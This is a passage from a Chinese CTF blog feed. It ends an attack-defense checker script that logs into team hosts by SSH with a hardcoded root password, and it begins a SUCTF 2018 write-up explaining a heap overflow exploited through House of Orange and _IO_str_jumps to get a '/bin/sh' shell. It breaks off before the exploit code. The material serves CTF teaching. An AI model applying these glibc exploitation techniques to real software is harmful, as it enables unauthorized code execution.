"127.0.0.1", 'status', 0&#125; </span></span><br><span class="line"><span class="string">        0 stands for normal and 1 stands for down</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        checker = Checker(ip, port, <span class="number">10</span>)</span><br><span class="line">        checker.function_check()</span><br><span class="line">        <span class="keyword">return</span> checker.getResult()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            <span class="keyword">print</span> e</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'invalid literal for int() with base 10:'</span> <span class="keyword">in</span> e :</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">(check_server, payload)</span>:</span></span><br><span class="line">    <span class="comment">#print payload</span></span><br><span class="line">    r = requests.post(check_server, data=payload)</span><br><span class="line">    <span class="keyword">print</span> r.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span><span class="params">(filename, str)</span>:</span></span><br><span class="line">    f = open(filename + <span class="string">".log"</span>, <span class="string">'ab'</span>)</span><br><span class="line">    f.write(str)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_log</span><span class="params">(info,ip=<span class="string">""</span>)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> info</span><br><span class="line">    log(log_file, info + <span class="string">"\n"</span>)</span><br><span class="line">    <span class="keyword">if</span> ip!=<span class="string">""</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">'./checkresult/'</span>):</span><br><span class="line">            os.makedirs(<span class="string">'./checkresult/'</span>)         </span><br><span class="line">        log(<span class="string">'./checkresult/'</span>+ip+<span class="string">'.log'</span>,<span class="string">'['</span>+time.asctime( time.localtime(time.time()) )+<span class="string">']  '</span>+ info + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CalcMD5</span><span class="params">(filepath)</span>:</span></span><br><span class="line">  <span class="keyword">with</span> open(filepath,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    md5obj = hashlib.md5()</span><br><span class="line">    md5obj.update(f.read())</span><br><span class="line">    hash = md5obj.hexdigest()</span><br><span class="line">    <span class="comment">#print(hash)</span></span><br><span class="line">    <span class="keyword">return</span> hash</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patch_check</span><span class="params">(file_path,standard,oip)</span>:</span></span><br><span class="line">    <span class="comment">#print "in"</span></span><br><span class="line">    f = open(file_path,<span class="string">"rb"</span>)</span><br><span class="line">    f_standard  = open(standard,<span class="string">'rb'</span>)</span><br><span class="line"><span class="comment">#main 0x3370 - 0x325a</span></span><br><span class="line">    f.seek(<span class="number">0x325a</span>,<span class="number">0</span>)</span><br><span class="line">    f_standard.seek(<span class="number">0x325a</span>,<span class="number">0</span>)</span><br><span class="line">    standard_tmp = f_standard.read(<span class="number">0x3370</span><span class="number">-0x325a</span>)</span><br><span class="line">    md5obj = hashlib.md5()</span><br><span class="line">    tmp = f.read(<span class="number">0x3370</span><span class="number">-0x325a</span>)</span><br><span class="line">    md5obj.update(tmp)</span><br><span class="line">    hash_tmp = md5obj.hexdigest()</span><br><span class="line">    md5obj = hashlib.md5()</span><br><span class="line">    <span class="comment">#tmp = f.read(0x28f0-0x1273)</span></span><br><span class="line">    md5obj.update(standard_tmp)</span><br><span class="line">    hash_standard = md5obj.hexdigest()    </span><br><span class="line">    <span class="keyword">if</span> (hash_tmp!=hash_standard):</span><br><span class="line">        f.close()</span><br><span class="line">        print_log(colored(<span class="string">'[Error] in patch main : '</span> + oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=oip)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>        </span><br><span class="line"><span class="comment"># init 0x29D6 0x2AB6</span></span><br><span class="line">    f.seek(<span class="number">0x29D6</span>,<span class="number">0</span>)</span><br><span class="line">    f_standard.seek(<span class="number">0x29D6</span>,<span class="number">0</span>)</span><br><span class="line">    standard_tmp = f_standard.read(<span class="number">0x2AB6</span><span class="number">-0x29D6</span>)</span><br><span class="line">    md5obj = hashlib.md5()</span><br><span class="line">    tmp = f.read(<span class="number">0x2AB6</span><span class="number">-0x29D6</span>)</span><br><span class="line">    md5obj.update(tmp)</span><br><span class="line">    hash_tmp = md5obj.hexdigest()</span><br><span class="line">    md5obj = hashlib.md5()</span><br><span class="line">    <span class="comment">#tmp = f.read(0x28f0-0x1273)</span></span><br><span class="line">    md5obj.update(standard_tmp)</span><br><span class="line">    hash_standard = md5obj.hexdigest()    </span><br><span class="line">    <span class="keyword">if</span> (hash_tmp!=hash_standard):</span><br><span class="line">        f.close()</span><br><span class="line">        print_log(colored(<span class="string">'[Error] in patch init : '</span> + oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=oip)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>   </span><br><span class="line"><span class="comment"># menu 0x2AB7 0x2b03</span></span><br><span class="line">    f.seek(<span class="number">0x2AB7</span>,<span class="number">0</span>)</span><br><span class="line">    f_standard.seek(<span class="number">0x2AB7</span>,<span class="number">0</span>)</span><br><span class="line">    standard_tmp = f_standard.read(<span class="number">0x2b03</span><span class="number">-0x2AB7</span>)</span><br><span class="line">    md5obj = hashlib.md5()</span><br><span class="line">    tmp = f.read(<span class="number">0x2b03</span><span class="number">-0x2AB7</span>)</span><br><span class="line">    md5obj.update(tmp)</span><br><span class="line">    hash_tmp = md5obj.hexdigest()</span><br><span class="line">    md5obj = hashlib.md5()</span><br><span class="line">    <span class="comment">#tmp = f.read(0x28f0-0x1273)</span></span><br><span class="line">    md5obj.update(standard_tmp)</span><br><span class="line">    hash_standard = md5obj.hexdigest()    </span><br><span class="line">    <span class="keyword">if</span> (hash_tmp!=hash_standard):</span><br><span class="line">        f.close()</span><br><span class="line">        print_log(colored(<span class="string">'[Error] in patch menu : '</span> + oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=oip)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    f.seek(<span class="number">0x4412</span>,<span class="number">0</span>)</span><br><span class="line">    flag_str =f.read(<span class="number">22</span>)</span><br><span class="line">    <span class="comment">#print flag_str</span></span><br><span class="line">    <span class="keyword">if</span> flag_str !=<span class="string">'/home/tsctf/flag/flag\0'</span>:</span><br><span class="line">        f.close()</span><br><span class="line">        print_log(colored(<span class="string">'[Error] in game-&gt;patch flag path : '</span> + oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=oip)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    f.seek(<span class="number">0x1273</span>,<span class="number">0</span>)</span><br><span class="line">    f_standard.seek(<span class="number">0x1273</span>,<span class="number">0</span>)</span><br><span class="line">    standard_tmp = f_standard.read(<span class="number">0x28f0</span><span class="number">-0x1273</span>)</span><br><span class="line">    md5obj = hashlib.md5()</span><br><span class="line">    tmp = f.read(<span class="number">0x28f0</span><span class="number">-0x1273</span>)</span><br><span class="line">    md5obj.update(tmp)</span><br><span class="line">    hash_tmp = md5obj.hexdigest()</span><br><span class="line">    md5obj = hashlib.md5()</span><br><span class="line">    <span class="comment">#tmp = f.read(0x28f0-0x1273)</span></span><br><span class="line">    md5obj.update(standard_tmp)</span><br><span class="line">    hash_standard = md5obj.hexdigest()    </span><br><span class="line">    <span class="keyword">if</span> (hash_tmp!=hash_standard):</span><br><span class="line">        f.close()</span><br><span class="line">        print_log(colored(<span class="string">'[Error] in game-&gt;patch game code : '</span> + oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=oip)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>        </span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_thread</span><span class="params">(round)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    function: cheinvalid literal for int() with base 10:ck every targeted ip</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    port = <span class="number">40111</span><span class="comment">#1022</span></span><br><span class="line">    ipbase = <span class="string">'172.16.20.'</span></span><br><span class="line">    team_num = <span class="number">17</span></span><br><span class="line"></span><br><span class="line">    check_result = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># if not debug:</span></span><br><span class="line">    <span class="comment">#    time.sleep(random.randint(10, 20))</span></span><br><span class="line"></span><br><span class="line">    print_log(</span><br><span class="line">        colored(<span class="string">'================= Round %d =================='</span> % round, <span class="string">"green"</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, team_num+<span class="number">1</span>):</span><br><span class="line">        ip = ipbase + str(i)</span><br><span class="line">        print_log(<span class="string">'check ip: '</span> + ip)</span><br><span class="line">        check_count = <span class="number">0</span></span><br><span class="line">        file_check  = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">            <span class="string">"""</span></span><br><span class="line"><span class="string">            check 5 times for every ip, </span></span><br><span class="line"><span class="string">            if check fail more than three times, then check result is down</span></span><br><span class="line"><span class="string">            """</span></span><br><span class="line">            <span class="comment">#ip = "127.0.0.1"</span></span><br><span class="line">            <span class="comment">#port = 2111</span></span><br><span class="line">            single_check = check(ip, port)</span><br><span class="line">            <span class="keyword">if</span> single_check == <span class="number">0</span>:</span><br><span class="line">                print_log(<span class="string">"[check %d] address: %s result: successful"</span> %</span><br><span class="line">                          (i + <span class="number">1</span>, ip))</span><br><span class="line">            <span class="keyword">elif</span> single_check == <span class="number">1</span>:</span><br><span class="line">                check_count += <span class="number">1</span></span><br><span class="line">                print_log(<span class="string">"[check %d] address: %s result: failed"</span> %</span><br><span class="line">                          (i + <span class="number">1</span>, ip))</span><br><span class="line">        <span class="comment"># check shell</span></span><br><span class="line">        <span class="comment"># to determine whether a team uses common guard</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ssh_shell = ssh(host=ip, port = <span class="number">1022</span>,user=<span class="string">'root'</span>, password=<span class="string">'GA7E12EH2C3CFEBBD1G4'</span>,cache=<span class="keyword">False</span>)</span><br><span class="line">            ssh_shell.download(file_path,<span class="string">'./file/'</span>+ip+<span class="string">'.bin'</span>)</span><br><span class="line">            ssh_shell.close()</span><br><span class="line">            <span class="comment">#print os.path.getsize('pwn1')</span></span><br><span class="line">            <span class="comment">#print CalcMD5("DNS_Server_standard")</span></span><br><span class="line">            <span class="comment">#print CalcMD5('./file/'+ip+'.bin')</span></span><br><span class="line">            <span class="keyword">if</span> (CalcMD5(<span class="string">"DNS_Server_standard"</span>)!= CalcMD5(<span class="string">'./file/'</span>+ip+<span class="string">'.bin'</span>)):</span><br><span class="line">                <span class="keyword">if</span> abs(os.path.getsize(<span class="string">'DNS_Server_standard'</span>) - os.path.getsize(<span class="string">'./file/'</span>+ip+<span class="string">'.bin'</span>)) &gt; <span class="number">128</span>:</span><br><span class="line">                    print_log(colored(<span class="string">'[Warning] find doubtful patch : '</span> + ip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=ip)</span><br><span class="line">                <span class="keyword">if</span>(coding_check_level):</span><br><span class="line">                    file_check = patch_check(<span class="string">'./file/'</span>+ip+<span class="string">'.bin'</span>,<span class="string">"DNS_Server_standard"</span>,ip)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print_log(</span><br><span class="line">                        colored(<span class="string">'[info] file size check ok: '</span> + ip + <span class="string">'\n'</span>, <span class="string">'green'</span>))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print_log(str(e))</span><br><span class="line">            print_log(</span><br><span class="line">                colored(<span class="string">'[Error] cannnot connect %s by ssh'</span> % ip, <span class="string">"yellow"</span>))</span><br><span class="line">    <span class="comment"># upload check result into server</span></span><br><span class="line">        <span class="keyword">if</span>(file_check==<span class="number">1</span>):</span><br><span class="line">            print_log(<span class="string">"[patch_check] address: %s result: successful"</span> %(ip))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print_log(<span class="string">"[patch_check] address: %s result: failed"</span> %(ip))    </span><br><span class="line">        print_log(<span class="string">""</span>)   </span><br><span class="line">        <span class="keyword">print</span> check_count,file_check</span><br><span class="line">        <span class="keyword">if</span> ((check_count &gt;= <span class="number">2</span>) | (file_check == <span class="number">0</span>)):</span><br><span class="line">            check_result.append(&#123;<span class="string">'tid'</span>:ip.split(<span class="string">'.'</span>)[<span class="number">-1</span>],<span class="string">'qid'</span>: <span class="string">'3'</span>, <span class="string">'state'</span>: <span class="number">2</span>&#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            check_result.append(&#123;<span class="string">'tid'</span>:ip.split(<span class="string">'.'</span>)[<span class="number">-1</span>],<span class="string">'qid'</span>: <span class="string">'3'</span>, <span class="string">'state'</span>: <span class="number">0</span>&#125;)   </span><br><span class="line">        <span class="comment">#print check_result</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#print json.dumps(check_result)</span></span><br><span class="line">        upload(<span class="string">"http://172.16.123.123/commapi/script/setServiceState"</span>,</span><br><span class="line">               &#123;<span class="string">'result'</span>: json.dumps(check_result)&#125;)</span><br><span class="line">        <span class="comment">#print json.dumps(check_result)</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print_log(<span class="string">'[HttpError] cannot connect to http server'</span>)</span><br><span class="line">    print_log(str(check_result))</span><br><span class="line">    print_log(<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_test</span><span class="params">()</span>:</span></span><br><span class="line">    port = <span class="number">2111</span></span><br><span class="line">    ipbase = <span class="string">'172.16.10.'</span></span><br><span class="line">    <span class="comment">#ip = '10.210.103.168'</span></span><br><span class="line">    check_result = []</span><br><span class="line">    check_count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        single_check = check(ip, port)</span><br><span class="line">        <span class="keyword">if</span> single_check == <span class="number">0</span>:</span><br><span class="line">            print_log(<span class="string">"[check %d] address: %s result: successful"</span> %</span><br><span class="line">                      (i + <span class="number">1</span>, ip))</span><br><span class="line">        <span class="keyword">elif</span> single_check == <span class="number">1</span>:</span><br><span class="line">            check_count += <span class="number">1</span></span><br><span class="line">            print_log(<span class="string">"[check %d] address: %s result: failed"</span> %</span><br><span class="line">                      (i + <span class="number">1</span>, ip))</span><br><span class="line">    print_log(<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">if</span> check_count &gt;= <span class="number">3</span>:</span><br><span class="line">        check_result.append(&#123;<span class="string">'ip'</span>: <span class="string">'172.16.20.3'</span>, <span class="string">'state'</span>: <span class="number">1</span>&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        check_result.append(&#123;<span class="string">'ip'</span>: <span class="string">'172.16.20.3'</span>, <span class="string">'state'</span>: <span class="number">0</span>&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># check shell</span></span><br><span class="line">        <span class="comment"># to determine whether a team uses common guard</span></span><br><span class="line">    <span class="comment"># upload check result into server</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        upload(<span class="string">"http://172.16.123.123/check_the_player.php"</span>,</span><br><span class="line">               &#123;<span class="string">'result'</span>: json.dumps(check_result)&#125;)</span><br><span class="line">        <span class="keyword">print</span> json.dumps(check_result)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print_log(<span class="string">'[HttpError] cannot connect to http server'</span>)</span><br><span class="line">    print_log(str(check_result))</span><br><span class="line">    print_log(<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    round = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">'./checkresult/'</span>):</span><br><span class="line">        os.makedirs(<span class="string">'./checkresult/'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">'./file/'</span>):</span><br><span class="line">        os.makedirs(<span class="string">'./file/'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        thread.start_new_thread(check_thread, (round, ))</span><br><span class="line">        time.sleep(round_time)  <span class="comment"># five minutes</span></span><br><span class="line">        round += <span class="number">1</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">1. patch heap</span></span><br><span class="line"><span class="string">2. login? 1.2.</span></span><br><span class="line"><span class="string">3. serach</span></span><br><span class="line"><span class="string">4. delete single</span></span><br><span class="line"><span class="string">5. </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><p>线下赛的时候在Checker机制中也发现了许多问题，对于通防的思路还是太窄，好在刚开始比赛的时候用size大小的方法+手工的方法查到了NeSE战队的通防，威逼利诱的情况下后来比赛中没有出现其他通防。</p>]]></content>
    
    <summary type="html">
    
      最近在胖哈勃的月赛和TSCTF2018 FINAL两场比赛担任了出题人的任务，在出题的过程中也学到了很多东西，分享一下题目的题解和相关的知识。
    
    </summary>
    
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>SUCTF 2018部分PWN题复现</title>
    <link href="http://p4nda.top/2018/05/29/suctf2018/"/>
    <id>http://p4nda.top/2018/05/29/suctf2018/</id>
    <published>2018-05-29T12:42:46.000Z</published>
    <updated>2018-07-05T13:41:46.520Z</updated>
    
    <content type="html"><![CDATA[<p>写论文已经两周了orz，今天终于写完了… SUCTF完全靠大佬们带飞，躺进XCTF联赛决赛圈了..</p><p><img src="/img/SUCTF2018/0.png" alt=""></p><h1 id="note"><a href="#note" class="headerlink" title="note"></a>note</h1><p>note这题也是被大佬们秒的比较多的题目了，我个人觉得这次PWN出的还是挺好的。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目有添加、显示、潘多拉魔盒（？）函数：</p><p>add：</p><p><img src="/img/SUCTF2018/1-1.png" alt=""></p><p>show:</p><p><img src="/img/SUCTF2018/1-2.png" alt=""></p><p>pandora box:</p><p><img src="/img/SUCTF2018/1-3.png" alt=""></p><p>可以看出add函数最多可以申请10次（用处不大？），起初初始化程序时申请了两个连续的0x88的块，在pandora box函数中释放，程序不存在修改操作。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞十分明显，在add函数中，对申请堆块的输入使用scanf(“%s”,(&amp;ptr)[i]，显然存在一个堆溢出漏洞，并且对堆块也没有释放操作。看上去让人容易联想起House of orange，其实也是（…）</p><p>题目给的库是libc 2.24的，也就是说必须使用_IO_str_jump的方法利用了。</p><p>简单的House of orange我曾经发过一篇原理在看雪论坛上，一起食用风味更佳：<a href="https://bbs.pediy.com/thread-223334.htm" target="_blank" rel="noopener">从BookWriter看house_of_orange原理【新手向】</a></p><p>具体house of orange的手法是用unsorted bin attack将_IO_list_all覆写成unsorted bin 头节点（libc bss段上的main_arena + 88），此时在出错时最终会调用_IO_flush_all函数，具体是程序会从_IO_list_all中取出保存的_IO_FILE_plus指针以虚表的形式调用_IO_flush_all函数。可攻击的点在于_IO_list_all是一个文件指针单链表，当一个指针不满足时会继续执行下一个指针，可以将指针控制到我们可以控制的堆块中（通过修改size），最终伪造_IO_FILE_plus指针内容，劫持控制流。</p><p>在libc 2.24中，增加的对_IO_FILE_plus中的虚表进行检查，不允许将虚表指向意外的地方：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *</span></span><br><span class="line"><span class="class"><span class="title">IO_validate_vtable</span> (<span class="title">const</span> <span class="title">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *ptr = (<span class="keyword">const</span> <span class="keyword">char</span> *) vtable;</span><br><span class="line">  <span class="keyword">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时，大佬们考虑将虚表指向一个libc已存在的虚表，这样可以绕过检查了，由于虚表里指针调用的函数偏移不同，将虚表劫持后，会执行另一个虚表的其他函数，这个虚表被劫持为_IO_str_jumps，当执行想_IO_flush_all，实际上执行了_IO_str_overflow函数，在这个函数中当可以绕过一些判断时，可以执行一个新的函数， new_buf = (char <em>) (</em>((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size); 这个函数同样是相对调用调用，fp时我们可以控制的内存，其内存参数可以通过size计算得到。</p><p>可以看到需要满足的条件时：</p><ol><li>pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only)</li></ol><ol><li>new_size &lt; old_blen</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_str_overflow (_IO_FILE *fp, <span class="keyword">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> flush_only = c == EOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line"><span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> *new_buf;</span><br><span class="line">  <span class="keyword">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">  <span class="keyword">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">  _IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  new_buf</span><br><span class="line">    = (<span class="keyword">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br><span class="line">  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/*  __ferror(fp) = 1; */</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (old_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">      (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class="line">      <span class="comment">/* Make sure _IO_setb won't try to delete _IO_buf_base. */</span></span><br><span class="line">      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">'\0'</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">  _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="keyword">unsigned</span> <span class="keyword">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br></pre></td></tr></table></figure><p>参考<a href="http://simp1e.leanote.com/post/Hctf-2017-babyprintf" target="_blank" rel="noopener">simp1e师傅之前关于Hctf-babyprintf题目的利用</a> ， 可以对参数进行构造：</p><p>2 * old_blen + 100 = addr of “/bin/sh”</p><p>old_blen = (fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base</p><p>构造 (fp)-&gt;_IO_buf_end =（ addr of “/bin/sh” - 100） /2</p><p>(fp)-&gt;_IO_buf_base = 0 即可</p><p>至于如何构造unsorted bin attack可以通过申请堆块，释放原有的堆块，申请小堆块，溢出写来得到，具体exp如下：</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 